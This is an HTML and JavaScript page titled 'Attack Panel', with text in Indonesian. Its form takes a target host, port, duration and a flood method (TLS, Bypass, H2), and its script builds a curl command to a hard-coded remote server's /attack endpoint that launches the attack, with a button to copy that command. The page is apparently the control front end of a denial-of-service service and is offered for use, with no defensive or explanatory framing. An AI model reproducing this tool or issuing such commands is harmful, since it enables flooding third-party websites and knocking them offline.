<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Attack Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #121212;
            color: white;
        }
        .container {
            margin-top: 50px;
        }
        input, select, button {
            display: block;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
        }
        button {
            background-color: red;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: darkred;
        }
        .log {
            margin-top: 20px;
            font-size: 14px;
            white-space: pre-line;
            word-break: break-word;
            max-width: 90%;
            margin-left: auto;
            margin-right: auto;
            background: #1e1e1e;
            padding: 15px;
            border-radius: 10px;
        }
        #copyButton {
            margin-top: 10px;
            background-color: green;
        }
        #copyButton:hover {
            background-color: darkgreen;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>üî• Attack Panel üî•</h1>

        <label>Target Host:</label>
        <input type="text" id="host" placeholder="https://target.com">

        <label>Port:</label>
        <input type="number" id="port" placeholder="80">

        <label>Time (Seconds):</label>
        <input type="number" id="time" placeholder="60">

        <label>Methods:</label>
        <select id="methods">
            <option value="tls">TLS</option>
            <option value="bypass">Bypass</option>
            <option value="h2">H2</option>
        </select>

        <button onclick="generateCurl()">üöÄ ATTACK!</button>

        <div class="log" id="log"></div>
        <button id="copyButton" onclick="copyCurl()" style="display:none;">üìã Copy Command</button>
    </div>

    <script>
        let currentCurl = '';

        function generateCurl() {
            const host = document.getElementById('host').value;
            const port = document.getElementById('port').value;
            const time = document.getElementById('time').value;
            const methods = document.getElementById('methods').value.toUpperCase();

            if (!host || !port || !time || !methods) {
                alert("‚ö†Ô∏è Harap isi semua data!");
                return;
            }

            const url = `http://64.227.139.46:4877/attack?host=${encodeURIComponent(host)}&port=${port}&time=${time}&methods=${methods}`;
            const curlCommand = `curl "${url}"`;

            currentCurl = curlCommand;

            document.getElementById("log").innerText = `üíª Command CURL:\n${curlCommand}`;
            document.getElementById("copyButton").style.display = "inline-block";
        }

        function copyCurl() {
            navigator.clipboard.writeText(currentCurl)
                .then(() => {
                    alert('‚úÖ Command berhasil di-copy!');
                })
                .catch(err => {
                    alert('‚ùå Gagal copy: ' + err);
                });
        }
    </script>

</body>
</html>
